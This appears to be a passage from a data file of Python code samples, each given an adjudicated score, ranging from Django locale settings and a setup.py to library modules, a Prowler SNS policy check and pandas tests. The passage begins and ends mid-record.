# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'l, j F, Y'
TIME_FORMAT = 'h:i a'
DATETIME_FORMAT = 'j F, Y h:i a'
YEAR_MONTH_FORMAT = 'F, Y'
MONTH_DAY_FORMAT = 'j F'
SHORT_DATE_FORMAT = 'j.M.Y'
SHORT_DATETIME_FORMAT = 'j.M.Y H:i'
FIRST_DAY_OF_WEEK = 1  # (Monday)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',     # '2006-10-25', '10/25/2006', '10/25/06'
    '%d.%m.%Y', '%d.%m.%y',                 # '25.10.2006', '25.10.06'
    # '%d %b %Y', '%d %b, %Y', '%d %b. %Y',   # '25 Oct 2006', '25 Oct, 2006', '25 Oct. 2006'
    # '%d %B %Y', '%d %B, %Y',                # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'
    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'
    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'
    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'
    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'
    '%d.%m.%y %H:%M',        # '25.10.06 14:30'
    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'
    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'
    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'
    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'
    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'
    '%m/%d/%y %H:%M',        # '10/25/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = "" ""
NUMBER_GROUPING = 3"
191	adjudicated	0	"#! /usr/bin/env python3

import os

try:
    from setuptools import find_packages, setup
except AttributeError:
    from setuptools import find_packages, setup

NAME = 'wofrysrw'
VERSION = '1.1.24'
ISRELEASED = True

DESCRIPTION = 'WOFRY for SRW library'
README_FILE = os.path.join(os.path.dirname(__file__), 'README.md')
LONG_DESCRIPTION = open(README_FILE).read()
AUTHOR = 'Luca Rebuffi'
AUTHOR_EMAIL = 'lrebuffi@anl.gov'
URL = 'https://github.com/lucarebuffi/wofrysrw'
DOWNLOAD_URL = 'https://github.com/lucarebuffi/wofrysrw'
LICENSE = 'GPLv3'

KEYWORDS = (
    'dictionary',
    'glossary',
    'synchrotron'
    'simulation',
)

CLASSIFIERS = (
    'Development Status :: 4 - Beta',
    'Environment :: X11 Applications :: Qt',
    'Environment :: Console',
    'Environment :: Plugins',
    'Programming Language :: Python :: 3',
    'Intended Audience :: Science/Research',
)

SETUP_REQUIRES = (
    'setuptools',
)

INSTALL_REQUIRES = (
    'setuptools',
    'numpy',
    'scipy',
    'syned>=1.0.26',
    'wofry>=1.0.31',
    'oasys-srwpy>=1.0.5'
)

PACKAGES = [
    ""wofrysrw"",
]

PACKAGE_DATA = {}

if __name__ == '__main__':
    try:
        import PyMca5, PyQt4

        raise NotImplementedError(""This version of wofrysrw doesn't work with Oasys1 beta.\nPlease install OASYS1 final release: https://www.aps.anl.gov/Science/Scientific-Software/OASYS"")
    except:
        setup(
              name = NAME,
              version = VERSION,
              description = DESCRIPTION,
              long_description = LONG_DESCRIPTION,
              author = AUTHOR,
              author_email = AUTHOR_EMAIL,
              url = URL,
              download_url = DOWNLOAD_URL,
              license = LICENSE,
              keywords = KEYWORDS,
              classifiers = CLASSIFIERS,
              packages = PACKAGES,
              package_data = PACKAGE_DATA,
              setup_requires = SETUP_REQUIRES,
              install_requires = INSTALL_REQUIRES,
              include_package_data = True,
              zip_safe = False,
              )"
311	adjudicated	0	"#!/usr/bin/env python
#
# Copyright 2017 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

from lxml import etree
import structlog
from netconf.nc_rpc.rpc import Rpc
import netconf.nc_common.error as ncerror

log = structlog.get_logger()


class CloseSession(Rpc):
    def __init__(self, request, request_xml, grpc_client, session,
                 capabilities):
        super(CloseSession, self).__init__(request, request_xml, grpc_client,
                                           session, capabilities)
        self._validate_parameters()

    def execute(self):
        log.info('close-session-request', session=self.session.session_id)
        if self.rpc_response.is_error:
            return self.rpc_response

        self.rpc_response.node = etree.Element(""ok"")

        # Set the close session flag
        self.rpc_response.close_session = True
        return self.rpc_response

    def _validate_parameters(self):

        if self.request:
            try:
                if self.request['command'] != 'close-session':
                    self.rpc_response.is_error = True
                    self.rpc_response.node = ncerror.BadMsg(self.request_xml)
                    return

            except Exception as e:
                self.rpc_response.is_error = True
                self.rpc_response.node = ncerror.ServerException(
                    self.request_xml)
                return"
80	adjudicated	4	"from rx import Observable, AnonymousObservable
from rx.internal.exceptions import SequenceContainsNoElementsError
from rx.internal import extensionmethod

def single_or_default_async(source, has_default=False, default_value=None):
    def subscribe(observer):
        value = [default_value]
        seen_value = [False]

        def on_next(x):
            if seen_value[0]:
                observer.on_error(Exception('Sequence contains more than one element'))
            else:
                value[0] = x
                seen_value[0] = True

        def on_completed():
            if not seen_value[0] and not has_default:
                observer.on_error(SequenceContainsNoElementsError())
            else:
                observer.on_next(value[0])
                observer.on_completed()

        return source.subscribe(on_next, observer.on_error, on_completed)
    return AnonymousObservable(subscribe)


@extensionmethod(Observable)
def single_or_default(self, predicate, default_value):
    """"""Returns the only element of an observable sequence that matches the
    predicate, or a default value if no such element exists this method
    reports an exception if there is more than one element in the observable
    sequence.

    Example:
    res = source.single_or_default()
    res = source.single_or_default(lambda x: x == 42)
    res = source.single_or_default(lambda x: x == 42, 0)
    res = source.single_or_default(None, 0)

    Keyword arguments:
    predicate -- {Function} A predicate function to evaluate for elements in
        the source sequence.
    default_value -- [Optional] The default value if the index is outside
        the bounds of the source sequence.

    Returns {Observable} Sequence containing the single element in the
    observable sequence that satisfies the condition in the predicate, or a
    default value if no such element exists.
    """"""

    return self.filter(predicate).single_or_default(None, default_value) if predicate else single_or_default_async(self, True, default_value)
    "
251	adjudicated	4	"""""""
Provide urlresolver functions that return fully qualified URLs or view names
""""""
from django.urls import NoReverseMatch
from django.urls import reverse as django_reverse
from django.utils.functional import lazy

from rest_framework.settings import api_settings
from rest_framework.utils.urls import replace_query_param


def preserve_builtin_query_params(url, request=None):
    """"""
    Given an incoming request, and an outgoing URL representation,
    append the value of any built-in query parameters.
    """"""
    if request is None:
        return url

    overrides = [
        api_settings.URL_FORMAT_OVERRIDE,
    ]

    for param in overrides:
        if param and (param in request.GET):
            value = request.GET[param]
            url = replace_query_param(url, param, value)

    return url


def reverse(viewname, args=None, kwargs=None, request=None, format=None, **extra):
    """"""
    If versioning is being used then we pass any `reverse` calls through
    to the versioning scheme instance, so that the resulting URL
    can be modified if needed.
    """"""
    scheme = getattr(request, 'versioning_scheme', None)
    if scheme is not None:
        try:
            url = scheme.reverse(viewname, args, kwargs, request, format, **extra)
        except NoReverseMatch:
            # In case the versioning scheme reversal fails, fallback to the
            # default implementation
            url = _reverse(viewname, args, kwargs, request, format, **extra)
    else:
        url = _reverse(viewname, args, kwargs, request, format, **extra)

    return preserve_builtin_query_params(url, request)


def _reverse(viewname, args=None, kwargs=None, request=None, format=None, **extra):
    """"""
    Same as `django.urls.reverse`, but optionally takes a request
    and returns a fully qualified URL, using the request to get the base URL.
    """"""
    if format is not None:
        kwargs = kwargs or {}
        kwargs['format'] = format
    url = django_reverse(viewname, args=args, kwargs=kwargs, **extra)
    if request:
        return request.build_absolute_uri(url)
    return url


reverse_lazy = lazy(reverse, str)"
331	adjudicated	3	"""""""
    pygments.styles.native
    ~~~~~~~~~~~~~~~~~~~~~~

    pygments version of my ""native"" vim theme.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Token, Whitespace


class NativeStyle(Style):
    """"""
    Pygments version of the ""native"" vim theme.
    """"""

    background_color = '#202020'
    highlight_color = '#404040'
    line_number_color = '#aaaaaa'

    styles = {
        Token:              '#d0d0d0',
        Whitespace:         '#666666',

        Comment:            'italic #ababab',
        Comment.Preproc:    'noitalic bold #cd2828',
        Comment.Special:    'noitalic bold #e50808 bg:#520000',

        Keyword:            'bold #6ebf26',
        Keyword.Pseudo:     'nobold',
        Operator.Word:      'bold #6ebf26',

        String:             '#ed9d13',
        String.Other:       '#ffa500',

        Number:             '#51b2fd',

        Name.Builtin:       '#2fbccd',
        Name.Variable:      '#40ffff',
        Name.Constant:      '#40ffff',
        Name.Class:         'underline #71adff',
        Name.Function:      '#71adff',
        Name.Namespace:     'underline #71adff',
        Name.Exception:     '#bbbbbb',
        Name.Tag:           'bold #6ebf26',
        Name.Attribute:     '#bbbbbb',
        Name.Decorator:     '#ffa500',

        Generic.Heading:    'bold #ffffff',
        Generic.Subheading: 'underline #ffffff',
        Generic.Deleted:    '#d22323',
        Generic.Inserted:   '#589819',
        Generic.Error:      '#d22323',
        Generic.Emph:       'italic',
        Generic.Strong:     'bold',
        Generic.Prompt:     '#aaaaaa',
        Generic.Output:     '#cccccc',
        Generic.Traceback:  '#d22323',

        Error:              'bg:#e3d2d2 #a61717'
    }"
271	adjudicated	2	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""insidetextfont"", parent_name=""funnelarea"", **kwargs
    ):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
360	adjudicated	2	"""""""Manager to read and modify frontend config data in JSON files.
""""""
# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

import os.path

from notebook.config_manager import BaseJSONConfigManager, recursive_update
from jupyter_core.paths import jupyter_config_dir, jupyter_config_path
from traitlets import Unicode, Instance, List, observe, default
from traitlets.config import LoggingConfigurable


class ConfigManager(LoggingConfigurable):
    """"""Config Manager used for storing notebook frontend config""""""

    # Public API

    def get(self, section_name):
        """"""Get the config from all config sections.""""""
        config = {}
        # step through back to front, to ensure front of the list is top priority
        for p in self.read_config_path[::-1]:
            cm = BaseJSONConfigManager(config_dir=p)
            recursive_update(config, cm.get(section_name))
        return config

    def set(self, section_name, data):
        """"""Set the config only to the user's config.""""""
        return self.write_config_manager.set(section_name, data)

    def update(self, section_name, new_data):
        """"""Update the config only to the user's config.""""""
        return self.write_config_manager.update(section_name, new_data)

    # Private API

    read_config_path = List(Unicode())

    @default('read_config_path')
    def _default_read_config_path(self):
        return [os.path.join(p, 'nbconfig') for p in jupyter_config_path()]

    write_config_dir = Unicode()

    @default('write_config_dir')
    def _default_write_config_dir(self):
        return os.path.join(jupyter_config_dir(), 'nbconfig')

    write_config_manager = Instance(BaseJSONConfigManager)

    @default('write_config_manager')
    def _default_write_config_manager(self):
        return BaseJSONConfigManager(config_dir=self.write_config_dir)

    @observe('write_config_dir')
    def _update_write_config_dir(self, change):
        self.write_config_manager = BaseJSONConfigManager(config_dir=self.write_config_dir)"
220	adjudicated	1	"# Copyright (c) 2006, 2010, 2012-2014 LOGILAB S.A. (Paris, FRANCE) <contact@logilab.fr>
# Copyright (c) 2012-2014 Google, Inc.
# Copyright (c) 2012 FELD Boris <lothiraldan@gmail.com>
# Copyright (c) 2014-2020 Claudiu Popa <pcmanticore@gmail.com>
# Copyright (c) 2014 Brett Cannon <brett@python.org>
# Copyright (c) 2014 Ricardo Gemignani <ricardo.gemignani@gmail.com>
# Copyright (c) 2014 Arun Persaud <arun@nubati.net>
# Copyright (c) 2015 Simu Toni <simutoni@gmail.com>
# Copyright (c) 2015 Ionel Cristian Maries <contact@ionelmc.ro>
# Copyright (c) 2017 KÃ¡ri Tristan Helgason <kthelgason@gmail.com>
# Copyright (c) 2018 ssolanki <sushobhitsolanki@gmail.com>
# Copyright (c) 2018 Sushobhit <31987769+sushobhit27@users.noreply.github.com>
# Copyright (c) 2018 Ville SkyttÃ¤ <ville.skytta@iki.fi>
# Copyright (c) 2019, 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2020 hippo91 <guillaume.peillex@gmail.com>
# Copyright (c) 2020 Anthony Sottile <asottile@umich.edu>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>
# Copyright (c) 2021 ruro <ruro.ruro@ya.ru>

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

""""""utilities methods and classes for reporters""""""


from pylint import utils
from pylint.reporters.base_reporter import BaseReporter
from pylint.reporters.collecting_reporter import CollectingReporter
from pylint.reporters.json_reporter import JSONReporter
from pylint.reporters.multi_reporter import MultiReporter
from pylint.reporters.reports_handler_mix_in import ReportsHandlerMixIn


def initialize(linter):
    """"""initialize linter with reporters in this package""""""
    utils.register_plugins(linter, __path__[0])


__all__ = [
    ""BaseReporter"",
    ""ReportsHandlerMixIn"",
    ""JSONReporter"",
    ""CollectingReporter"",
    ""MultiReporter"",
]"
393	adjudicated	3	"# Copyright 2017-present Open Networking Foundation
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# Copyright (c) 2008 The Board of Trustees of The Leland Stanford Junior University
# Copyright (c) 2011, 2012 Open Networking Foundation
# Copyright (c) 2012, 2013 Big Switch Networks, Inc.
# See the file LICENSE.pyloxi which should have been included in the source distribution
# Automatically generated by LOXI from template toplevel_init.py
# Do not modify

version_names = {
    1: ""1.0"",
    2: ""1.1"",
    3: ""1.2"",
    4: ""1.3"",
    5: ""1.4"",
}

def protocol(ver):
    """"""
    Import and return the protocol module for the given wire version.
    """"""
    if ver == 1:
        import of10
        return of10

    if ver == 2:
        import of11
        return of11

    if ver == 3:
        import of12
        return of12

    if ver == 4:
        import of13
        return of13

    if ver == 5:
        import of14
        return of14

    raise ValueError

class ProtocolError(Exception):
    """"""
    Raised when failing to deserialize an invalid OpenFlow message.
    """"""
    pass

class Unimplemented(Exception):
    """"""
    Raised when an OpenFlow feature is not yet implemented in PyLoxi.
    """"""
    pass

def unimplemented(msg):
    raise Unimplemented(msg)

class OFObject(object):
    """"""
    Superclass of all OpenFlow classes
    """"""
    def __init__(self, *args):
        raise NotImplementedError(""cannot instantiate abstract class"")

    def __ne__(self, other):
        return not self.__eq__(other)

    def show(self):
        import loxi.pp
        return loxi.pp.pp(self)"
2	adjudicated	4	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j M Y'                   # '25 Oct 2006'
TIME_FORMAT = 'P'                       # '2:30 p.m.'
DATETIME_FORMAT = 'j M Y, P'            # '25 Oct 2006, 2:30 p.m.'
YEAR_MONTH_FORMAT = 'F Y'               # 'October 2006'
MONTH_DAY_FORMAT = 'j F'                # '25 October'
SHORT_DATE_FORMAT = 'd/m/Y'             # '25/10/2006'
SHORT_DATETIME_FORMAT = 'd/m/Y P'       # '25/10/2006 2:30 p.m.'
FIRST_DAY_OF_WEEK = 0                   # Sunday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d/%m/%Y', '%d/%m/%y',             # '25/10/2006', '25/10/06'
    # '%b %d %Y', '%b %d, %Y',          # 'Oct 25 2006', 'Oct 25, 2006'
    # '%d %b %Y', '%d %b, %Y',          # '25 Oct 2006', '25 Oct, 2006'
    # '%B %d %Y', '%B %d, %Y',          # 'October 25 2006', 'October 25, 2006'
    # '%d %B %Y', '%d %B, %Y',          # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',                # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',             # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',                   # '2006-10-25 14:30'
    '%d/%m/%Y %H:%M:%S',                # '25/10/2006 14:30:59'
    '%d/%m/%Y %H:%M:%S.%f',             # '25/10/2006 14:30:59.000200'
    '%d/%m/%Y %H:%M',                   # '25/10/2006 14:30'
    '%d/%m/%y %H:%M:%S',                # '25/10/06 14:30:59'
    '%d/%m/%y %H:%M:%S.%f',             # '25/10/06 14:30:59.000200'
    '%d/%m/%y %H:%M',                   # '25/10/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = ','
NUMBER_GROUPING = 3"
142	adjudicated	0	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.sns.sns_client import sns_client


class sns_topics_not_publicly_accessible(Check):
    def execute(self):
        findings = []
        for topic in sns_client.topics:
            report = Check_Report_AWS(self.metadata())
            report.region = topic.region
            report.resource_id = topic.name
            report.resource_arn = topic.arn
            report.status = ""PASS""
            report.status_extended = f""SNS topic {topic.name} without public access""
            if topic.policy:
                for statement in topic.policy[""Statement""]:
                    # Only check allow statements
                    if statement[""Effect""] == ""Allow"":
                        if (
                            ""*"" in statement[""Principal""]
                            or (
                                ""AWS"" in statement[""Principal""]
                                and ""*"" in statement[""Principal""][""AWS""]
                            )
                            or (
                                ""CanonicalUser"" in statement[""Principal""]
                                and ""*"" in statement[""Principal""][""CanonicalUser""]
                            )
                        ):
                            if ""Condition"" not in statement:
                                report.status = ""FAIL""
                                report.status_extended = (
                                    f""SNS topic {topic.name} policy with public access""
                                )
                            else:
                                report.status = ""FAIL""
                                report.status_extended = f""SNS topic {topic.name} policy with public access but has a Condition""

            findings.append(report)

        return findings"
53	adjudicated	0	"import esphome.codegen as cg
import esphome.config_validation as cv

from esphome.components import binary_sensor, display
from esphome.const import CONF_PAGE_ID

from .. import touchscreen_ns, CONF_TOUCHSCREEN_ID, Touchscreen, TouchListener

DEPENDENCIES = [""touchscreen""]

TouchscreenBinarySensor = touchscreen_ns.class_(
    ""TouchscreenBinarySensor"",
    binary_sensor.BinarySensor,
    cg.Component,
    TouchListener,
    cg.Parented.template(Touchscreen),
)

CONF_X_MIN = ""x_min""
CONF_X_MAX = ""x_max""
CONF_Y_MIN = ""y_min""
CONF_Y_MAX = ""y_max""


def validate_coords(config):
    if (
        config[CONF_X_MAX] < config[CONF_X_MIN]
        or config[CONF_Y_MAX] < config[CONF_Y_MIN]
    ):
        raise cv.Invalid(
            f""{CONF_X_MAX} is less than {CONF_X_MIN} or {CONF_Y_MAX} is less than {CONF_Y_MIN}""
        )
    return config


CONFIG_SCHEMA = cv.All(
    binary_sensor.binary_sensor_schema(TouchscreenBinarySensor)
    .extend(
        {
            cv.GenerateID(CONF_TOUCHSCREEN_ID): cv.use_id(Touchscreen),
            cv.Required(CONF_X_MIN): cv.int_range(min=0, max=2000),
            cv.Required(CONF_X_MAX): cv.int_range(min=0, max=2000),
            cv.Required(CONF_Y_MIN): cv.int_range(min=0, max=2000),
            cv.Required(CONF_Y_MAX): cv.int_range(min=0, max=2000),
            cv.Optional(CONF_PAGE_ID): cv.use_id(display.DisplayPage),
        }
    )
    .extend(cv.COMPONENT_SCHEMA),
    validate_coords,
)


async def to_code(config):
    var = await binary_sensor.new_binary_sensor(config)
    await cg.register_component(var, config)
    await cg.register_parented(var, config[CONF_TOUCHSCREEN_ID])

    cg.add(
        var.set_area(
            config[CONF_X_MIN],
            config[CONF_X_MAX],
            config[CONF_Y_MIN],
            config[CONF_Y_MAX],
        )
    )

    if CONF_PAGE_ID in config:
        page = await cg.get_variable(config[CONF_PAGE_ID])
        cg.add(var.set_page(page))"
282	adjudicated	0	"#!/usr/bin/env python

# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os

from google.cloud.automl_v1beta1 import Model

import pytest

import automl_tables_model
import automl_tables_predict
import model_test


PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]
REGION = ""us-central1""
STATIC_MODEL = model_test.STATIC_MODEL
GCS_INPUT = ""gs://{}-automl-tables-test/bank-marketing.csv"".format(PROJECT)
GCS_OUTPUT = ""gs://{}-automl-tables-test/TABLE_TEST_OUTPUT/"".format(PROJECT)
BQ_INPUT = ""bq://{}.automl_test.bank_marketing"".format(PROJECT)
BQ_OUTPUT = ""bq://{}"".format(PROJECT)
PARAMS = {}


@pytest.mark.slow
def test_batch_predict(capsys):
    ensure_model_online()

    automl_tables_predict.batch_predict(
        PROJECT, REGION, STATIC_MODEL, GCS_INPUT, GCS_OUTPUT, PARAMS
    )
    out, _ = capsys.readouterr()
    assert ""Batch prediction complete"" in out


@pytest.mark.slow
def test_batch_predict_bq(capsys):
    ensure_model_online()
    automl_tables_predict.batch_predict_bq(
        PROJECT, REGION, STATIC_MODEL, BQ_INPUT, BQ_OUTPUT, PARAMS
    )
    out, _ = capsys.readouterr()
    assert ""Batch prediction complete"" in out


def ensure_model_online():
    model = model_test.ensure_model_ready()
    if model.deployment_state != Model.DeploymentState.DEPLOYED:
        automl_tables_model.deploy_model(PROJECT, REGION, model.display_name)

    return automl_tables_model.get_model(PROJECT, REGION, model.display_name)"
113	adjudicated	2	"""""""
This module includes some utility functions for inspecting the layout
of a GDAL data source -- the functionality is analogous to the output
produced by the `ogrinfo` utility.
""""""

from django.contrib.gis.gdal import DataSource
from django.contrib.gis.gdal.geometries import GEO_CLASSES


def ogrinfo(data_source, num_features=10):
    """"""
    Walk the available layers in the supplied `data_source`, displaying
    the fields for the first `num_features` features.
    """"""

    # Checking the parameters.
    if isinstance(data_source, str):
        data_source = DataSource(data_source)
    elif isinstance(data_source, DataSource):
        pass
    else:
        raise Exception(
            ""Data source parameter must be a string or a DataSource object.""
        )

    for i, layer in enumerate(data_source):
        print(""data source : %s"" % data_source.name)
        print(""==== layer %s"" % i)
        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)
        print(""  # features: %s"" % len(layer))
        print(""         srs: %s"" % layer.srs)
        extent_tup = layer.extent.tuple
        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))
        print(""Displaying the first %s features ===="" % num_features)

        width = max(*map(len, layer.fields))
        fmt = "" %%%ss: %%s"" % width
        for j, feature in enumerate(layer[:num_features]):
            print(""=== Feature %s"" % j)
            for fld_name in layer.fields:
                type_name = feature[fld_name].type_name
                output = fmt % (fld_name, type_name)
                val = feature.get(fld_name)
                if val:
                    if isinstance(val, str):
                        val_fmt = ' (""%s"")'
                    else:
                        val_fmt = "" (%s)""
                    output += val_fmt % val
                else:
                    output += "" (None)""
                print(output)"
214	adjudicated	0	"import datetime

import numpy as np
import pytest

from pandas import (
    DataFrame,
    Series,
    _testing as tm,
)
from pandas.tests.io.pytables.common import ensure_clean_store

pytestmark = pytest.mark.single_cpu


def test_store_datetime_fractional_secs(setup_path):

    with ensure_clean_store(setup_path) as store:
        dt = datetime.datetime(2012, 1, 2, 3, 4, 5, 123456)
        series = Series([0], [dt])
        store[""a""] = series
        assert store[""a""].index[0] == dt


def test_tseries_indices_series(setup_path):

    with ensure_clean_store(setup_path) as store:
        idx = tm.makeDateIndex(10)
        ser = Series(np.random.randn(len(idx)), idx)
        store[""a""] = ser
        result = store[""a""]

        tm.assert_series_equal(result, ser)
        assert result.index.freq == ser.index.freq
        tm.assert_class_equal(result.index, ser.index, obj=""series index"")

        idx = tm.makePeriodIndex(10)
        ser = Series(np.random.randn(len(idx)), idx)
        store[""a""] = ser
        result = store[""a""]

        tm.assert_series_equal(result, ser)
        assert result.index.freq == ser.index.freq
        tm.assert_class_equal(result.index, ser.index, obj=""series index"")


def test_tseries_indices_frame(setup_path):

    with ensure_clean_store(setup_path) as store:
        idx = tm.makeDateIndex(10)
        df = DataFrame(np.random.randn(len(idx), 3), index=idx)
        store[""a""] = df
        result = store[""a""]

        tm.assert_frame_equal(result, df)
        assert result.index.freq == df.index.freq
        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")

        idx = tm.makePeriodIndex(10)
        df = DataFrame(np.random.randn(len(idx), 3), idx)
        store[""a""] = df
        result = store[""a""]

        tm.assert_frame_equal(result, df)
        assert result.index.freq == df.index.freq
        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")"
185	adjudicated	0	"#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
#    Copyright (C) 2022 by YOUR NAME HERE
#
#    This file is part of RoboComp
#
#    RoboComp is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    RoboComp is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with RoboComp.  If not, see <http://www.gnu.org/licenses/>.

import sys, Ice, os
from PySide2 import QtWidgets, QtCore

ROBOCOMP = ''
try:
    ROBOCOMP = os.environ['ROBOCOMP']
except KeyError:
    print('$ROBOCOMP environment variable not set, using the default value /opt/robocomp')
    ROBOCOMP = '/opt/robocomp'

Ice.loadSlice(""-I ./src/ --all ./src/CommonBehavior.ice"")
import RoboCompCommonBehavior




class GenericWorker(QtCore.QObject):

    kill = QtCore.Signal()

    def __init__(self, mprx):
        super(GenericWorker, self).__init__()

        self.people_proxy = mprx[""PeopleProxy""]
        self.people1_proxy = mprx[""PeopleProxy1""]
        self.peoplepub_proxy = mprx[""PeoplePub""]

        self.mutex = QtCore.QMutex(QtCore.QMutex.Recursive)
        self.Period = 30
        self.timer = QtCore.QTimer(self)


    @QtCore.Slot()
    def killYourSelf(self):
        rDebug(""Killing myself"")
        self.kill.emit()

    # \brief Change compute period
    # @param per Period in ms
    @QtCore.Slot(int)
    def setPeriod(self, p):
        print(""Period changed"", p)
        self.Period = p
        self.timer.start(self.Period)"
354	adjudicated	1	"import builtins
import logging
import signal
import threading
import traceback
import warnings

import trio


class TrioRunner:
    def __init__(self):
        self._cell_cancel_scope = None
        self._trio_token = None

    def initialize(self, kernel, io_loop):
        kernel.shell.set_trio_runner(self)
        kernel.shell.run_line_magic(""autoawait"", ""trio"")
        kernel.shell.magics_manager.magics[""line""][""autoawait""] = lambda _: warnings.warn(
            ""Autoawait isn't allowed in Trio background loop mode.""
        )
        bg_thread = threading.Thread(target=io_loop.start, daemon=True, name=""TornadoBackground"")
        bg_thread.start()

    def interrupt(self, signum, frame):
        if self._cell_cancel_scope:
            self._cell_cancel_scope.cancel()
        else:
            raise Exception(""Kernel interrupted but no cell is running"")

    def run(self):
        old_sig = signal.signal(signal.SIGINT, self.interrupt)

        def log_nursery_exc(exc):
            exc = ""\n"".join(traceback.format_exception(type(exc), exc, exc.__traceback__))
            logging.error(""An exception occurred in a global nursery task.\n%s"", exc)

        async def trio_main():
            self._trio_token = trio.lowlevel.current_trio_token()
            async with trio.open_nursery() as nursery:
                # TODO This hack prevents the nursery from cancelling all child
                # tasks when an uncaught exception occurs, but it's ugly.
                nursery._add_exc = log_nursery_exc
                builtins.GLOBAL_NURSERY = nursery  # type:ignore[attr-defined]
                await trio.sleep_forever()

        trio.run(trio_main)
        signal.signal(signal.SIGINT, old_sig)

    def __call__(self, async_fn):
        async def loc(coro):
            self._cell_cancel_scope = trio.CancelScope()
